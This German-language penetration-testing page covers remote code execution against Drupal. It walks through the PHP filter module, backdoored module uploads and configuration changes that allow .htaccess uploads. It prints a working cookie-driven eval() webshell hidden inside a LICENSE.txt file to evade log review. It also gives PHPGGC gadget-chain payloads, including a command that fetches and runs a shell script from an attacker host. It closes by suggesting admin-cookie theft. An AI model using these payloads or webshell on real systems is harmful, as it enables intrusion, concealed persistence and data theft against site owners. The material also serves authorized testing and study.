# Drupal RCE

{{#include ../../../banners/hacktricks-training.md}}

## Mit PHP Filter Module

> [!WARNING]
> In älteren Versionen von Drupal **(vor Version 8)** war es möglich, sich als Administrator anzumelden und **das `PHP filter` Modul zu aktivieren**, welches "Ermöglicht eingebetteten PHP-Code/Snippets auszuwerten." Ab Version 8 ist dieses Modul jedoch nicht standardmäßig installiert.

1. Gehe zu **/modules/php** und wenn ein 403-Fehler zurückgegeben wird, ist das **`PHP filter` Plugin installiert und du kannst fortfahren**
1. Falls nicht, gehe zu `Modules` und aktiviere das Kontrollkästchen von `PHP Filter` und klicke dann auf `Save configuration`
2. Um es auszunutzen, klicke auf `Add content`, dann wähle `Basic Page` oder `Article` und schreibe die **PHP backdoor**, wähle dann `PHP` als Textformat und schließlich `Preview`
3. Um es auszulösen, rufe einfach den neu erstellten node auf:
```bash
curl http://drupal.local/node/3
```
## PHP Filter Modul installieren

> [!WARNING]
> In aktuellen Versionen ist es nicht mehr möglich, Plugins nur über den Webzugriff zu installieren, nachdem die Standardinstallation durchgeführt wurde.

Ab Version **8** ist das [**PHP Filter**](https://www.drupal.org/project/php/releases/8.x-1.1) **Modul nicht standardmäßig installiert**. Um diese Funktionalität zu nutzen, müssten wir das **Modul selbst installieren**.

1. Lade die aktuellste Version des Moduls von der Drupal-Website herunter.
1. `wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz`
2. Sobald heruntergeladen, gehe zu **`Administration`** > **`Reports`** > **`Available updates`**.
3. Klicke auf **`Browse`**, wähle die Datei aus dem Verzeichnis, in das wir sie heruntergeladen haben, und klicke dann auf **`Install`**.
4. Sobald das Modul installiert ist, können wir auf **`Content`** klicken und **eine neue Basic page erstellen**, ähnlich wie im Drupal 7 Beispiel. Achte erneut darauf, **`PHP code` aus dem `Text format` Dropdown auszuwählen**.

## Backdoored Module

> [!WARNING]
> In aktuellen Versionen ist es nicht mehr möglich, Plugins nur über den Webzugriff zu installieren, nachdem die Standardinstallation durchgeführt wurde.

Es war möglich, ein **Modul** herunterzuladen, eine **Backdoor** hinzuzufügen und es zu **installieren**. Zum Beispiel das Herunterladen des [**Trurnstile**](https://www.drupal.org/project/turnstile) Moduls im komprimierten Format, das Erstellen einer neuen PHP-Backdoor-Datei darin und das Ermöglichen des Zugriffs auf die PHP-Datei mittels einer `.htaccess`-Datei:
```html
<IfModule mod_rewrite.c> RewriteEngine On RewriteBase / </IfModule>
```
Und dann zu **`http://drupal.local/admin/modules/install`** gehen, um das backdoored Modul zu installieren und **`/modules/turnstile/back.php`** aufzurufen, um es auszuführen.

## Backdooring Drupal with Configuration synchronization <a href="#backdooring-drupal" id="backdooring-drupal"></a>

**Beitrag geteilt von** [**Coiffeur0x90**](https://twitter.com/Coiffeur0x90)

### Teil 1 (Aktivierung von _Media_ und _Media Library_)

Im _Extend_-Menü (/admin/modules) kannst du Plugins aktivieren, die bereits installiert zu sein scheinen. Standardmäßig sind die Plugins _Media_ und _Media Library_ nicht aktiviert, also aktivieren wir sie.

Before activation:

<figure><img src="../../../images/image (4) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

After activation:

<figure><img src="../../../images/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../images/image (2) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Teil 2 (Nutzung der Funktion _Configuration synchronization_) <a href="#part-2-leveraging-feature-configuration-synchronization" id="part-2-leveraging-feature-configuration-synchronization"></a>

Wir nutzen die Funktion _Configuration synchronization_, um Drupal-Konfigurationseinträge zu exportieren (dump) und zu importieren (upload):

- /admin/config/development/configuration/single/export
- /admin/config/development/configuration/single/import

**system.file.yml patchen**

Beginnen wir damit, den ersten Eintrag `allow_insecure_uploads` von:

File: system.file.yml
```

...

allow_insecure_uploads: false

...

```
<figure><img src="../../../images/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Zu:

Datei: system.file.yml
```

...

allow_insecure_uploads: true

...

```
<figure><img src="../../../images/image (4) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Patchen der Datei field.field.media.document.field_media_document.yml**

Dann ändern Sie den zweiten Eintrag `file_extensions` von:

Datei: field.field.media.document.field_media_document.yml
```

...

file_directory: '[date:custom:Y]-[date:custom:m]'
file_extensions: 'txt rtf doc docx ppt pptx xls xlsx pdf odf odg odp ods odt fodt fods fodp fodg key numbers pages'

...
```
<figure><img src="../../../images/image (5) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Zu:

Datei: field.field.media.document.field_media_document.yml
```
...

file_directory: '[date:custom:Y]-[date:custom:m]'
file_extensions: 'htaccess txt rtf doc docx ppt pptx xls xlsx pdf odf odg odp ods odt fodt fods fodp fodg key numbers pages'

...

```
Ich verwende es in diesem Blogpost nicht, aber es wird darauf hingewiesen, dass der Eintrag `file_directory` beliebig definiert werden kann und für eine path traversal attack verwundbar ist (so können wir im Drupal-Dateisystembaum nach oben gehen).

<figure><img src="../../../images/image (6) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Part 3 (leveraging feature _Add Document_) <a href="#part-3-leveraging-feature-add-document" id="part-3-leveraging-feature-add-document"></a>

Der letzte Schritt ist der einfachste und gliedert sich in zwei Teilschritte. Zuerst laden wir eine Datei im .htaccess-Format hoch, um die Apache-Direktiven zu nutzen und .txt-Dateien vom PHP-Interpreter interpretieren zu lassen. Als zweites laden wir eine .txt-Datei hoch, die unseren payload enthält.

Datei: .htaccess
```
<Files *>
SetHandler application/x-httpd-php
</Files>

# Vroum! Vroum!
# We reactivate PHP engines for all versions in order to be targetless.
<IfModule mod_php.c>
php_flag engine on
</IfModule>
<IfModule mod_php7.c>
php_flag engine on
</IfModule>
<IfModule mod_php5.c>
php_flag engine on
</IfModule>
```
Warum ist dieser Trick cool?

Weil, sobald die Webshell (die wir LICENSE.txt nennen) auf dem Webserver abgelegt wurde, wir unsere Befehle über `$_COOKIE` übertragen können und dies in den Webserver-Logs als legitime GET-Anfrage an eine Textdatei erscheint.

Warum unsere Webshell LICENSE.txt nennen?

Ganz einfach: Wenn wir zum Beispiel die folgende Datei [core/LICENSE.txt](https://github.com/drupal/drupal/blob/11.x/core/LICENSE.txt) (die bereits im Drupal-Core vorhanden ist) nehmen, haben wir eine Datei mit 339 Zeilen und 17,6 KB Größe, die sich perfekt eignet, um in der Mitte einen kleinen PHP-Snippet einzufügen (da die Datei groß genug ist).

<figure><img src="../../../images/image (7) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Datei: Gepatchte LICENSE.txt
```txt

...

this License, you may choose any version ever published by the Free Software
Foundation.

<?php

# We inject our payload into the cookies so that in the logs of the compromised
# server it shows up as having been requested via the GET method, in order to
# avoid raising suspicions.
if (isset($_COOKIE["89e127753a890d9c4099c872704a0711bbafbce9"])) {
if (!empty($_COOKIE["89e127753a890d9c4099c872704a0711bbafbce9"])) {
eval($_COOKIE["89e127753a890d9c4099c872704a0711bbafbce9"]);
} else {
phpinfo();
}
}

?>

10. If you wish to incorporate parts of the Program into other free
programs whose distribution conditions are different, write to the author

...

```
#### **Teil 3.1 (Datei .htaccess hochladen)**

Zuerst nutzen wir die _Add Document_ (/media/add/document) Funktion, um unsere Datei mit den Apache-Direktiven (.htaccess) hochzuladen.

<figure><img src="../../../images/image (8) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../images/image (9) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../images/image (10) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Teil 3.2 (Datei LICENSE.txt hochladen)**

Dann nutzen wir erneut die _Add Document_ (/media/add/document) Funktion, um eine innerhalb einer Lizenzdatei versteckte Webshell hochzuladen.

<figure><img src="../../../images/image (11) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../images/image (12) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../images/image (13) (1).png" alt=""><figcaption></figcaption></figure>

### Teil 4 (Interaktion mit der Webshell) <a href="#part-4-interaction-with-the-webshell" id="part-4-interaction-with-the-webshell"></a>

Der letzte Teil besteht darin, mit der Webshell zu interagieren.

Wie im folgenden Screenshot gezeigt, erhalten wir beim Aufrufen der Datei im Webbrowser das folgende Ergebnis, wenn das von unserer Webshell erwartete cookie nicht gesetzt ist.

<figure><img src="../../../images/image (14) (1).png" alt=""><figcaption></figcaption></figure>

Wenn der Angreifer das cookie setzt, kann er mit der Webshell interagieren und beliebige Befehle ausführen.

<figure><img src="../../../images/image (15) (1).png" alt=""><figcaption></figcaption></figure>

Und wie in den Logs zu sehen ist, sieht es so aus, als wäre nur eine txt-Datei angefordert worden.

<figure><img src="../../../images/image (16) (1).png" alt=""><figcaption></figcaption></figure>

Danke, dass Sie sich die Zeit genommen haben, diesen Artikel zu lesen. Ich hoffe, er hilft Ihnen, einige Shells zu bekommen.

## Drupal core gadget chain (SA-CORE-2024-007 / SA-CORE-2024-008)

Two advisories published **20. Nov 2024** (CVE-2024-55637 & CVE-2024-55638) describe new **PHP object gadget chains in Drupal core** (7.0–7.101, 8.x, 10.2.0–10.2.10, 10.3.0–10.3.8, early 11.x). They are **not directly exploitable** but give attackers a ready-made chain once any contrib/module performs `unserialize()` on user input.

Praktisches Vorgehen zur Ausnutzung:

1. **Find the unserialize sink** (contrib module oder eigener Code). Grep den Codebase nach `unserialize(` oder `Drupal\Component\Serialization\PhpSerialize::decode`. Zielendpunkte sind solche, die POST/JSON oder Konfigurations-Imports akzeptieren.
2. **Generate a payload** unter Verwendung des anfälligen Klassenpfads, der zur gadget chain passt. Nach SA-CORE-2024-008 wurde die öffentliche Kette zu gängigen Payload-Generatoren hinzugefügt. Beispiel mit PHPGGC (commit ≥ Dec 2024):
```bash
./phpggc drupal/rce2 system 'id' > payload.ser
```
3. **Übergebe das serialisierte Blob** an den Sink (z. B. Parameter, der deserialisiert wird). Für einen form-encoded body:
```bash
curl -X POST https://target/admin/config/some/module \
-d "serialized_setting=$(cat payload.ser)"
```
4. **Zerstörung auslösen** (oft automatisch am Ende der Anfrage) und den Befehl ausführen.

Hinweise zum Testen:

- Gadget funktioniert nur bei Versionen **vor 10.2.11 / 10.3.9 / 7.102** (gepatcht). Überprüfe die Zielversion über `/core/lib/Drupal.php` oder `CHANGELOG.txt`.
- Drittanbieter-DB-Treiber könnten zusätzliche Härtung benötigen; suche nach Bereitstellungen, die das Sicherheitsupdate-Fenster übersprungen haben.

## Kürzlich: unsichere Deserialisierung in contrib-Modulen → RCE

Mehrere contrib-Module haben Ende 2024 unsichere `unserialize()`-Pfade behoben. Wenn die Site diese Updates nicht hat, liefern sie die ausnutzbare sink, die für die core gadget chain erforderlich ist:

- **Mailjet** (<4.0.1, CVE-2024-13296): vom Administrator kontrollierte Daten werden an `unserialize()` übergeben, was **PHP Object Injection → RCE** ermöglicht, wenn es mit den core gadgets verkettet wird.
- **Eloqua** (7.x-1.x < 1.15, CVE-2024-13297): ähnliche unsichere Nutzung von `unserialize()`, erreichbar für Benutzer mit `access administration pages`.

Testidee (authentifiziert):
```bash
phpggc drupal/rce2 system 'bash -c "curl http://attacker/shell.sh|sh"' > p.ser
curl -b session=ADMINCOOKIE \
-F "import=@p.ser" https://target/admin/config/eloqua/import
```
Wenn das Modul die hochgeladenen Daten deserialisiert, führt die gadget chain zu RCE. Mit XSS/CSRF kombinieren, um Admin-Cookies zu stehlen und so eine vollständige Angriffskette zu erreichen.

## Referenzen

- [Drupal core – gadget chain – SA-CORE-2024-008](https://www.drupal.org/sa-core-2024-008)
- [Mailjet module – arbitrary PHP code execution – SA-CONTRIB-2024-062](https://www.drupal.org/sa-contrib-2024-062)

{{#include ../../../banners/hacktricks-training.md}}
